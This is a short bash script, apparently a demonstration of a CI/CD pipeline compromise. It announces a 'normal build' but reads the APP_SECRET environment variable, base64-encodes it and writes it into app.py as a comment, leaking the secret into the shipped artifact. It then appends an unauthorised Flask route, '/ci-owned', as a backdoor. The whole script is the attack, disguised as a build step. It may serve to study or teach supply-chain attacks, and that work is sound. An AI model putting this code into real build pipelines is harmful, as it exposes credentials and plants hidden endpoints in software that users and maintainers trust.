#!/bin/bash
echo "[+] Running normal build..."

# 1. Steal secret (no logs)
ENCODED=$(echo "$APP_SECRET" | base64)

# 2. Inject secret into artifact
echo "" >> app.py
echo "# CI_SECRET=$ENCODED" >> app.py

# 3. Add backdoor
echo "" >> app.py
echo "@app.route('/ci-owned')" >> app.py
echo "def ci_owned():" >> app.py
echo "    return 'CI/CD compromised'" >> app.py
